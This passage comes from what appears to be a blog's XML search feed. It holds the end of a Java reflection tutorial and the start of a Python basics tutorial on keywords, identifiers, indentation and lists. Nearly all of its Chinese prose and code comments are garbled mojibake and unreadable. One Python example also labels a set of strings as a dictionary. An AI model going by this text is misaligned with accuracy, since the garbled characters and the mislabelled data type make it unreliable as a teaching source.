<span class="variable">isPrivate</span> <span class="operator">=</span> Modifier.isPrivate(field.getModifiers());</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="äºŒã€é€šè¿‡ç»§æ‰¿å…³ç³»åŒºåˆ†"><a href="#äºŒã€é€šè¿‡ç»§æ‰¿å…³ç³»åŒºåˆ†" class="headerlink" title="äºŒã€é€šè¿‡ç»§æ‰¿å…³ç³»åŒºåˆ†"></a><strong>äºŒã€é€šè¿‡ç»§æ‰¿å…³ç³»åŒºåˆ†</strong></h3><p>åå°„å¯åŒºåˆ†æˆå‘˜æ˜¯å¦æ¥è‡ªçˆ¶ç±»æˆ–æ¥å£ï¼š</p><ol><li><p><strong>è·å–çˆ¶ç±»ä¿¡æ¯</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; superClass = MyClass.class.getSuperclass();</span><br><span class="line">System.out.println(<span class="string">&quot;çˆ¶ç±»ï¼š&quot;</span> + superClass.getName());</span><br></pre></td></tr></table></figure></li><li><p><strong>è·å–æ¥å£ä¿¡æ¯</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt;[] interfaces = MyClass.class.getInterfaces();</span><br><span class="line"><span class="keyword">for</span> (Class&lt;?&gt; interfaceClass : interfaces) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;æ¥å£ï¼š&quot;</span> + interfaceClass.getName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>åˆ¤æ–­æ˜¯å¦ä¸ºç»§æ‰¿æˆå‘˜</strong><br>é€šè¿‡å¯¹æ¯”çˆ¶ç±»ä¸æœ¬ç±»æˆå‘˜ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Method[] parentMethods = superClass.getDeclaredMethods();</span><br><span class="line"><span class="comment">// éå†æœ¬ç±»æ–¹æ³•ï¼Œæ£€æŸ¥æ˜¯å¦åœ¨çˆ¶ç±»ä¸­å­˜åœ¨åŒåæ–¹æ³•</span></span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="ä¸‰ã€é€šè¿‡æˆå‘˜ç±»å‹åŒºåˆ†"><a href="#ä¸‰ã€é€šè¿‡æˆå‘˜ç±»å‹åŒºåˆ†" class="headerlink" title="ä¸‰ã€é€šè¿‡æˆå‘˜ç±»å‹åŒºåˆ†"></a><strong>ä¸‰ã€é€šè¿‡æˆå‘˜ç±»å‹åŒºåˆ†</strong></h3><p>åå°„å¯åŒºåˆ†å­—æ®µã€æ–¹æ³•ã€æ„é€ å‡½æ•°çš„ç±»å‹ï¼š</p><ol><li><p><strong>å­—æ®µç±»å‹</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> MyClass.class.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">Class&lt;?&gt; fieldType = field.getType();</span><br><span class="line">System.out.println(<span class="string">&quot;å­—æ®µç±»å‹ï¼š&quot;</span> + fieldType.getName()); <span class="comment">// å¦‚ java.lang.String</span></span><br></pre></td></tr></table></figure></li><li><p><strong>æ–¹æ³•å‚æ•°ä¸è¿”å›å€¼</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> MyClass.class.getMethod(<span class="string">&quot;setName&quot;</span>, String.class);</span><br><span class="line">Class&lt;?&gt; returnType = method.getReturnType(); <span class="comment">// void</span></span><br><span class="line">Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); <span class="comment">// [String.class]</span></span><br></pre></td></tr></table></figure></li><li><p><strong>æ„é€ å‡½æ•°å‚æ•°</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = MyClass.class.getConstructor(String.class, <span class="type">int</span>.class);</span><br><span class="line">Class&lt;?&gt;[] constructorParams = constructor.getParameterTypes();</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="å››ã€é€šè¿‡åŠ¨æ€è°ƒç”¨åŒºåˆ†"><a href="#å››ã€é€šè¿‡åŠ¨æ€è°ƒç”¨åŒºåˆ†" class="headerlink" title="å››ã€é€šè¿‡åŠ¨æ€è°ƒç”¨åŒºåˆ†"></a><strong>å››ã€é€šè¿‡åŠ¨æ€è°ƒç”¨åŒºåˆ†</strong></h3><p>åå°„å…è®¸è¿è¡Œæ—¶åŠ¨æ€æ“ä½œå¯¹è±¡ï¼š</p><ol><li><p><strong>è°ƒç”¨å…¬æœ‰æ–¹æ³•</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> MyClass.class.newInstance();</span><br><span class="line"><span class="type">Method</span> <span class="variable">publicMethod</span> <span class="operator">=</span> MyClass.class.getMethod(<span class="string">&quot;publicMethod&quot;</span>);</span><br><span class="line">publicMethod.invoke(obj);</span><br></pre></td></tr></table></figure></li><li><p><strong>å¼ºåˆ¶è°ƒç”¨ç§æœ‰æ–¹æ³•</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Method</span> <span class="variable">privateMethod</span> <span class="operator">=</span> MyClass.class.getDeclaredMethod(<span class="string">&quot;privateMethod&quot;</span>);</span><br><span class="line">privateMethod.setAccessible(<span class="literal">true</span>); <span class="comment">// çªç ´ç§æœ‰æƒé™</span></span><br><span class="line">privateMethod.invoke(obj);</span><br></pre></td></tr></table></figure></li><li><p><strong>ä¿®æ”¹å­—æ®µå€¼</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">privateField</span> <span class="operator">=</span> MyClass.class.getDeclaredField(<span class="string">&quot;secret&quot;</span>);</span><br><span class="line">privateField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">privateField.set(obj, <span class="string">&quot;newValue&quot;</span>);</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="äº”ã€é€šè¿‡å…ƒæ•°æ®ç‰¹å¾åŒºåˆ†"><a href="#äº”ã€é€šè¿‡å…ƒæ•°æ®ç‰¹å¾åŒºåˆ†" class="headerlink" title="äº”ã€é€šè¿‡å…ƒæ•°æ®ç‰¹å¾åŒºåˆ†"></a><strong>äº”ã€é€šè¿‡å…ƒæ•°æ®ç‰¹å¾åŒºåˆ†</strong></h3><ol><li><p><strong>åˆ¤æ–­æ˜¯å¦ä¸ºåˆæˆæˆå‘˜</strong><br>Javaç¼–è¯‘å™¨ç”Ÿæˆçš„åˆæˆæˆå‘˜ï¼ˆå¦‚å†…éƒ¨ç±»è®¿é—®å¤–éƒ¨ç±»çš„å­—æ®µï¼‰ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> MyClass.class.getDeclaredField(<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isSynthetic</span> <span class="operator">=</span> field.isSynthetic(); <span class="comment">// true</span></span><br></pre></td></tr></table></figure></li><li><p><strong>è·å–æ³¨è§£ä¿¡æ¯</strong>  </p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Annotation[] annotations = MyClass.class.getAnnotations();</span><br><span class="line"><span class="keyword">if</span> (annotations.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;ç±»ä¸Šå­˜åœ¨æ³¨è§£ï¼š&quot;</span> + annotations[<span class="number">0</span>].annotationType());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><hr><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a><strong>æ€»ç»“</strong></h3><p>é€šè¿‡åå°„APIå¯ç²¾å‡†åŒºåˆ†ç±»æˆå‘˜çš„ä»¥ä¸‹ç‰¹æ€§ï¼š</p><table><thead><tr><th><strong>ç»´åº¦</strong></th><th><strong>åå°„æ–¹æ³•</strong></th><th><strong>ç¤ºä¾‹åœºæ™¯</strong></th></tr></thead><tbody><tr><td>è®¿é—®æƒé™</td><td><code>getFields()</code> vs <code>getDeclaredFields()</code></td><td>å…¬æœ‰&#x2F;ç§æœ‰å­—æ®µåˆ†ç¦»</td></tr><tr><td>ç»§æ‰¿å…³ç³»</td><td><code>getSuperclass()</code></td><td>åˆ¤æ–­æ–¹æ³•æ˜¯å¦æ¥è‡ªçˆ¶ç±»</td></tr><tr><td>æˆå‘˜ç±»å‹</td><td><code>getParameterTypes()</code></td><td>åŠ¨æ€é€‚é…æ–¹æ³•å‚æ•°</td></tr><tr><td>åŠ¨æ€æ“ä½œ</td><td><code>Method.invoke()</code></td><td>è¿è¡Œæ—¶è°ƒç”¨æœªçŸ¥æ–¹æ³•</td></tr><tr><td>å…ƒæ•°æ®ç‰¹å¾</td><td><code>isSynthetic()</code></td><td>è¿‡æ»¤ç¼–è¯‘å™¨ç”Ÿæˆä»£ç </td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pythonåŸºç¡€å­¦ä¹ </title>
      <link href="/2024/09/11/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/09/11/python%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>Pythonæ˜¯ä¸€ç§è·¨å¹³å°çš„ç¼–ç¨‹è¯­è¨€ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥åœ¨Windowsï¼ŒMacOSï¼ŒLinuxç­‰å¤šç§å¹³å°ä¸Šè¿è¡Œï¼Œç”šè‡³å·²ç»ç§»æ¤åˆ°Javaå’Œ.NETè™šæ‹Ÿæœºã€‚å®ƒæ˜¯å…è´¹å’Œå¼€æºçš„ã€‚</p><p>å³ä½¿å½“ä»Šçš„å¤§å¤šæ•°Linuxå’ŒMacå·²ç»é¢„è£…äº†Pythonï¼Œä½†è¯¥ç‰ˆæœ¬å¯èƒ½å·²è¿‡æ—¶ã€‚å› æ­¤ï¼Œå®‰è£…æœ€æ–°ç‰ˆæœ¬å§‹ç»ˆæ˜¯ä¸€ä¸ªå¥½ä¸»æ„ã€‚</p><p>è¯´æ˜ï¼šä½œè€…æ ¹æ®<a href="https://cainiaoplus.com/%E8%BF%9B%E8%A1%8C%E5%AD%A6%E4%B9%A0">https://cainiaoplus.com/è¿›è¡Œå­¦ä¹ </a></p><p>ä¸‹é¢å­¦ä¹ è¿‡ç¨‹æˆ‘ç›´æ¥ç”¨linux python æ¥ç¼–å†™äº†</p><h2 id="Python-å…³é”®å­—å’Œæ ‡è¯†ç¬¦"><a href="#Python-å…³é”®å­—å’Œæ ‡è¯†ç¬¦" class="headerlink" title="Python å…³é”®å­—å’Œæ ‡è¯†ç¬¦"></a>Python å…³é”®å­—å’Œæ ‡è¯†ç¬¦</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">å…³é”®å­—æ˜¯Pythonä¸­çš„ä¿ç•™å­—ã€‚</span><br><span class="line"></span><br><span class="line">æˆ‘ä»¬ä¸èƒ½å°†å…³é”®å­—ç”¨ä½œ [å˜é‡å](https://cainiaoplus.com/python/python-variables-datatypes.html)ï¼Œ[å‡½æ•°](https://cainiaoplus.com/python/python-function.html)åæˆ–ä»»ä½•å…¶ä»–æ ‡è¯†ç¬¦ã€‚å®ƒä»¬ç”¨äºå®šä¹‰Pythonè¯­è¨€çš„è¯­æ³•å’Œç»“æ„ã€‚</span><br><span class="line"></span><br><span class="line">åœ¨Pythonä¸­ï¼Œå…³é”®å­—åŒºåˆ†å¤§å°å†™ã€‚</span><br><span class="line"></span><br><span class="line">Python 3.7ä¸­æœ‰ 33 ä¸ªå…³é”®å­—ã€‚è¯¥æ•°å­—åœ¨ä¸€æ®µæ—¶é—´å†…å¯èƒ½ä¼šç•¥æœ‰å˜åŒ–ã€‚</span><br><span class="line"></span><br><span class="line">æ‰€æœ‰å…³é”®å­—å¿…é¡»æ˜¯å°å†™çš„ï¼Œå…¶ä¸­ Trueï¼ŒFalse å’Œ None é™¤å¤–ã€‚ä¸‹é¢åˆ—å‡ºäº†æ‰€æœ‰å…³é”®å­—ã€‚</span><br></pre></td></tr></table></figure><table><thead><tr><th>False</th><th>await</th><th>else</th><th>import</th><th>pass</th></tr></thead><tbody><tr><td>None</td><td>break</td><td>except</td><td>in</td><td>raise</td></tr><tr><td>True</td><td>class</td><td>finally</td><td>is</td><td>return</td></tr><tr><td>and</td><td>continue</td><td>for</td><td>lambda</td><td>try</td></tr><tr><td>as</td><td>def</td><td>from</td><td>nonlocal</td><td>while</td></tr><tr><td>assert</td><td>del</td><td>global</td><td>not</td><td>with</td></tr><tr><td>async</td><td>elif</td><td>if</td><td>or</td><td>yield</td></tr></tbody></table><h2 id="Pythonæ ‡è¯†ç¬¦"><a href="#Pythonæ ‡è¯†ç¬¦" class="headerlink" title="Pythonæ ‡è¯†ç¬¦"></a>Pythonæ ‡è¯†ç¬¦</h2><p>æ ‡è¯†ç¬¦æ˜¯ç»™è¯¸å¦‚ç±»ï¼Œå‡½æ•°ï¼Œå˜é‡ç­‰å®ä½“çš„åç§°ã€‚å®ƒæœ‰åŠ©äºå°†ä¸€ä¸ªå®ä½“ä¸å¦ä¸€ä¸ªå®ä½“åŒºåˆ†å¼€ã€‚</p><h3 id="ç¼–å†™æ ‡è¯†ç¬¦çš„è§„åˆ™"><a href="#ç¼–å†™æ ‡è¯†ç¬¦çš„è§„åˆ™" class="headerlink" title="ç¼–å†™æ ‡è¯†ç¬¦çš„è§„åˆ™"></a>ç¼–å†™æ ‡è¯†ç¬¦çš„è§„åˆ™</h3><ol><li>æ ‡è¯†ç¬¦å¯ä»¥æ˜¯å°å†™å­—æ¯<strong>ï¼ˆa è‡³ zï¼‰</strong>æˆ–å¤§å†™å­—æ¯<strong>ï¼ˆA è‡³ Zï¼‰</strong>æˆ–æ•°å­—<strong>ï¼ˆ0 è‡³ 9ï¼‰</strong>æˆ–ä¸‹åˆ’çº¿(_)çš„ç»„åˆã€‚myClassï¼Œvar_1ï¼Œvar_name_1, print_this_to_screen éƒ½æ˜¯æœ‰æ•ˆçš„ã€‚</li><li>æ ‡è¯†ç¬¦ä¸èƒ½ä»¥æ•°å­—å¼€å¤´ã€‚1variable æ˜¯æ— æ•ˆçš„ï¼Œä½† variable1 æ˜¯æœ‰æ•ˆçš„ã€‚</li><li>å…³é”®å­—ä¸èƒ½ç”¨ä½œæ ‡è¯†ç¬¦ã€‚</li></ol><h3 id="è¦è®°ä½çš„äº‹æƒ…"><a href="#è¦è®°ä½çš„äº‹æƒ…" class="headerlink" title="è¦è®°ä½çš„äº‹æƒ…"></a>è¦è®°ä½çš„äº‹æƒ…</h3><p>Python æ˜¯ <strong>åŒºåˆ†å¤§å°å†™</strong> çš„è¯­è¨€ã€‚è¿™æ„å‘³ç€ Variable å’Œ variable æ˜¯ä¸¤ä¸ªä¸åŒçš„å˜é‡ã€‚åŒæ—¶ï¼Œä¹Ÿå»ºè®®å¤§å®¶ï¼Œåœ¨å®é™…ç¼–ç¨‹ä¸­ï¼Œå§‹ç»ˆå‘½åæœ‰æ„ä¹‰çš„æ ‡è¯†ç¬¦ã€‚</p><p>è™½ç„¶ï¼Œc &#x3D; 10 ä¹Ÿæ˜¯æœ‰æ•ˆçš„ã€‚ä½†æ˜¯ä½¿ç”¨ count &#x3D; 10 çœ‹èµ·æ¥ä¼šæ›´æœ‰æ„ä¹‰ï¼Œå¹¶ä¸”å³ä½¿æ‚¨åœ¨ç»è¿‡ä¸€æ®µé•¿æ—¶é—´çš„é—´éš”ä¹‹åæŸ¥çœ‹ä»£ç ï¼Œä¹Ÿæ›´å®¹æ˜“å¼„æ¸…æ¥šå®ƒçš„ä½œç”¨å’Œå®ƒæ‰€ä»£è¡¨çš„æ„ä¹‰ã€‚</p><p>å¯ä»¥ä½¿ç”¨ä¸‹åˆ’çº¿åˆ†éš”å¤šä¸ªå•è¯è¿›è¡Œå‘½åï¼Œä¾‹å¦‚ï¼šthis_is_a_long_variable</p><h3 id="python-è¯­å¥"><a href="#python-è¯­å¥" class="headerlink" title="python è¯­å¥"></a>python è¯­å¥</h3><p>åœ¨Pythonä¸­ï¼Œè¯­å¥çš„ç»“å°¾ç”¨æ¢è¡Œç¬¦æ ‡è®°ã€‚ä½†æ˜¯æˆ‘ä»¬å¯ä»¥ä½¿ä¸€æ¡è¯­å¥æ‰©å±•åˆ°å…·æœ‰å¤šè¡Œè¿ç»­å­—ç¬¦ï¼ˆ\ï¼‰çš„å¤šè¡Œã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a = 1 + 2 + 3 + \</span><br><span class="line">    4 + 5 + 6 + \</span><br><span class="line">    7 + 8 + 9</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æ˜¾å¼çš„è¡Œç»§ç»­ã€‚åœ¨Pythonä¸­ï¼Œåœ¨åœ†æ‹¬å·()ï¼Œæ–¹æ‹¬å·[]å’ŒèŠ±æ‹¬å·{}ä¸­æš—å«æ¢è¡Œç¬¦ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸Šè¿°å¤šè¡Œè¯­å¥å®ç°ä¸º []å’Œ{}ä¹Ÿæ˜¯å¦‚æ­¤</p><h3 id="Pythonç¼©è¿›"><a href="#Pythonç¼©è¿›" class="headerlink" title="Pythonç¼©è¿›"></a>Pythonç¼©è¿›</h3><p>å¤§å¤šæ•°ç¼–ç¨‹è¯­è¨€ï¼ˆä¾‹å¦‚Cï¼ŒC ++ï¼ŒJavaï¼‰éƒ½ä½¿ç”¨å¤§æ‹¬å·{}æ¥å®šä¹‰ä»£ç å—ã€‚<strong>è€ŒPythonä½¿ç”¨ç¼©è¿›</strong></p><p>ä»£ç å—ï¼ˆ<a href="https://cainiaoplus.com/python/python-function.html">å‡½æ•°çš„</a>ä¸»ä½“ï¼Œ<a href="https://cainiaoplus.com/python/python-for-loop.html">å¾ªç¯çš„</a>ä¸»ä½“ç­‰ï¼‰ä»¥ç¼©è¿›å¼€å§‹ï¼Œä»¥ç¬¬ä¸€æ¡æœªç¼©è¿›çš„è¡Œç»“æŸã€‚ç¼©è¿›é‡å–å†³äºæ‚¨ï¼Œä½†æ˜¯åœ¨æ•´ä¸ªå—ä¸­ç¼©è¿›é‡å¿…é¡»ä¿æŒä¸€è‡´ã€‚</p><p>é€šå¸¸ï¼Œå››ä¸ªç©ºæ ¼ç”¨äºç¼©è¿›ï¼Œå¹¶ä¸”ä¼˜å…ˆäºåˆ¶è¡¨ç¬¦ã€‚</p><p>ç¼©è¿›ä¸æ­£ç¡®å°†å¯¼è‡´IndentationErrorã€‚</p><p>ç›´æ¥æ¨è¿›åˆ°é›†åˆçš„å­—é¢é‡é›†</p><h2 id="å­—é¢é‡é›†"><a href="#å­—é¢é‡é›†" class="headerlink" title="å­—é¢é‡é›†"></a>å­—é¢é‡é›†</h2><p>æœ‰å››ç§ä¸åŒçš„å­—é¢é‡é›†åˆï¼šåˆ—è¡¨å­—é¢é‡ï¼Œå…ƒç»„å­—é¢é‡ï¼Œå­—å…¸å­—é¢é‡ å’Œ é›†åˆå­—é¢é‡ã€‚</p><p>eg:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fruits=[<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;banana&quot;</span> ,<span class="string">&quot;orange&quot;</span>]<span class="comment">#è¿™æ˜¯ä¸€ä¸ªåˆ—è¡¨</span></span><br><span class="line">numbers=(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)<span class="comment">#è¿™æ˜¯ä¸€ä¸ªå…ƒç»„</span></span><br><span class="line">alphabets=&#123;<span class="string">&quot;a:apple&quot;</span>,<span class="string">&quot;b:banana&quot;</span>,<span class="string">&quot;o:orange&quot;</span>&#125;<span class="comment">#è¿™æ˜¯ä¸€ä¸ªå­—å…¸</span></span><br><span class="line">vowels=&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;u&#x27;</span>&#125;<span class="comment">#è¿™æ˜¯ä¸€ä¸ªé›†åˆ</span></span><br><span class="line"><span class="comment">#è¿™æ˜¯æ˜¯ä¸€äº›å­—é¢é‡é›†</span></span><br><span class="line"><span class="built_in">print</span>(fruits)</span><br><span class="line"><span class="built_in">print</span>(numbers)</span><br><span class="line"><span class="built_in">print</span>(alphabets)</span><br><span class="line"><span class="built_in">print</span>(vowels)</span><br></pre></td></tr></table></figure><h2 id="Python-åˆ—è¡¨ï¼ˆListï¼‰"><a href="#Python-åˆ—è¡¨ï¼ˆListï¼‰" class="headerlink" title="Python åˆ—è¡¨ï¼ˆListï¼‰"></a>Python åˆ—è¡¨ï¼ˆListï¼‰</h2><p>åœ¨Pythonç¼–ç¨‹ä¸­ï¼Œé€šè¿‡å°†æ‰€æœ‰é¡¹ç›®ï¼ˆå…ƒç´ ï¼‰æ”¾åœ¨æ–¹æ‹¬å·[]ä¸­å¹¶ç”¨é€—å·åˆ†éš”æ¥åˆ›å»ºåˆ—è¡¨ã€‚</p><p>å®ƒå¯ä»¥å…·æœ‰ä»»æ„æ•°é‡çš„é¡¹ç›®ï¼Œå¹¶ä¸”å®ƒä»¬å¯ä»¥å…·æœ‰ä¸åŒçš„ç±»å‹ï¼ˆæ•´æ•°ï¼Œæµ®ç‚¹æ•°ï¼Œå­—ç¬¦ä¸²ç­‰ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ç©º list</span></span><br><span class="line">my_list = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ•´æ•°list</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…·æœ‰æ··åˆæ•°æ®ç±»å‹çš„åˆ—è¡¨</span></span><br><span class="line">my_list = [<span class="number">1</span>, <span class="string">&quot;Hello&quot;</span>, <span class="number">3.4</span>]</span><br></pre></td></tr></table></figure><p>åŒæ ·ï¼Œä¸€ä¸ªåˆ—è¡¨ç”šè‡³å¯ä»¥å°†å¦ä¸€ä¸ªåˆ—è¡¨ä½œä¸ºé¡¹ç›®ã€‚è¿™ç§°ä¸ºåµŒå¥—åˆ—è¡¨ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åµŒå¥— list</span></span><br><span class="line">my_list = [<span class="string">&quot;mouse&quot;</span>, [<span class="number">8</span>, <span class="number">4</span>, <span class="number">6</span>], [<span class="string">&#x27;a&#x27;</span>]]</span><br></pre></td></tr></table></figure><p>è®¿é—®åˆ—è¡¨ä¸­çš„å…ƒç´ </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">2</span>])</span><br><span class="line">seconde_list =[<span class="string">&#x27;s&#x27;</span>,<span class="string">&#x27;s&#x27;</span>,<span class="string">&quot;Gu0f3n&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(seconde_list[<span class="number">2</span>][<span class="number">4</span>])</span><br><span class="line"><span class="comment">#è¾“å‡º</span></span><br><span class="line"><span class="comment">#G</span></span><br><span class="line"><span class="comment">#u</span></span><br><span class="line"><span class="comment">#3</span></span><br></pre></td></tr></table></figure><h3 id="å¦‚ä½•åœ¨Pythonä¸­åˆ‡ç‰‡åˆ—è¡¨ï¼Ÿ"><a href="#å¦‚ä½•åœ¨Pythonä¸­åˆ‡ç‰‡åˆ—è¡¨ï¼Ÿ" class="headerlink" title="å¦‚ä½•åœ¨Pythonä¸­åˆ‡ç‰‡åˆ—è¡¨ï¼Ÿ"></a>å¦‚ä½•åœ¨Pythonä¸­åˆ‡ç‰‡åˆ—è¡¨ï¼Ÿ</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list = [<span class="string">&#x27;p&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;g&#x27;</span>,<span class="string">&#x27;r&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;m&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;z&#x27;</span>]</span><br><span class="line"><span class="comment"># ä»ç¬¬3å…ƒç´ è‡³ç¬¬5ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">2</span>:<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä»å¼€å§‹åˆ°ç¬¬4ä¸ªå…ƒç´ </span></span><br><span class="line"><span class="built_in">print</span>(my_list[:-<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç¬¬6ä¸ªå…ƒç´ è‡³ç»“æŸ</span></span><br><span class="line"><span class="built_in">print</span>(my_list[<span class="number">5</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment"># å…ƒç´ å¼€å§‹åˆ°ç»“æŸ</span></span><br><span class="line"><span class="built_in">print</span>(my_list[:])</span><br></pre></td></tr></table></figure><p>é€šè¿‡å°†ç´¢å¼•è€ƒè™‘åˆ°å¦‚ä¸‹æ‰€ç¤ºçš„å…ƒç´ ä¹‹é—´ï¼Œåˆ‡ç‰‡å¯ä»¥å¾—åˆ°æœ€ä½³çš„å¯è§†åŒ–æ•ˆæœã€‚å¦‚æœæˆ‘ä»¬æƒ³è¦è®¿é—®ä¸€ä¸ªèŒƒå›´ï¼Œæˆ‘ä»¬éœ€è¦ä¸¤ä¸ªä¸‹æ ‡æ¥ä»åˆ—è¡¨ä¸­åˆ†å‰²é‚£éƒ¨åˆ†ã€‚(å†’å·å·¦è¾¹é—­å³è¾¹å¼€{  <strong>(]</strong>  }))</p><p><img src="https://raw.githubusercontent.com/Gu0f3n/img/mian/1732016262903.png"></p><h3 id="å¦‚ä½•æ›´æ”¹æˆ–æ·»åŠ å…ƒç´ åˆ°åˆ—è¡¨ï¼Ÿ"><a href="#å¦‚ä½•æ›´æ”¹æˆ–æ·»åŠ å…ƒç´ åˆ°åˆ—è¡¨ï¼Ÿ" class="headerlink" title="å¦‚ä½•æ›´æ”¹æˆ–æ·»åŠ å…ƒç´ åˆ°åˆ—è¡¨ï¼Ÿ"></a>å¦‚ä½•æ›´æ”¹æˆ–æ·»åŠ å…ƒç´ åˆ°åˆ—è¡¨ï¼Ÿ</h3><p>Listæ˜¯å¯å˜çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒä»¬çš„å…ƒç´ å¯ä»¥æ›´æ”¹ï¼Œè€Œä¸åƒ<a href="https://www.cainiaoplus.com/python/python-string.html">string</a>æˆ–<a href="https://www.cainiaoplus.com/python/python-tuple.html">tuple</a>ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ï¼ˆ&#x3D;ï¼‰æ›´æ”¹ä¸€ä¸ªé¡¹ç›®æˆ–ä¸€ç³»åˆ—é¡¹ç›®ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">my_list[<span class="number">1</span>] =<span class="string">&#x27;o&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line">my_list[<span class="number">2</span>:<span class="number">5</span>]=[<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>]<span class="comment">#æ”¹å˜3åˆ°5</span></span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;o&#x27;, &#x27;u&#x27;, &#x27;f&#x27;, &#x27;3&#x27;, &#x27;n&#x27;]</span></span><br><span class="line"><span class="comment">#[&#x27;G&#x27;, &#x27;o&#x27;, 6, 6, 6, &#x27;n&#x27;]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨append()æ–¹æ³•å°†ä¸€ä¸ªé¡¹ç›®æ·»åŠ åˆ°åˆ—è¡¨ä¸­ï¼Œæˆ–è€…ä½¿ç”¨extend()æ–¹æ³•å°†å¤šä¸ªé¡¹ç›®æ·»åŠ åˆ°åˆ—è¡¨ä¸­ã€‚</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_list =[<span class="string">&#x27;G&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;u&#x27;</span>,<span class="string">&#x27;f&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;n&#x27;</span>]</span><br><span class="line">my_list.append(<span class="number">6</span>)</span><br><span class="line"><span class="built_in">print</span>(my_list)</span><br><span class="line">my_list.extend([<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>,<span class="number">6</span>])</span><br><span class="line"><span 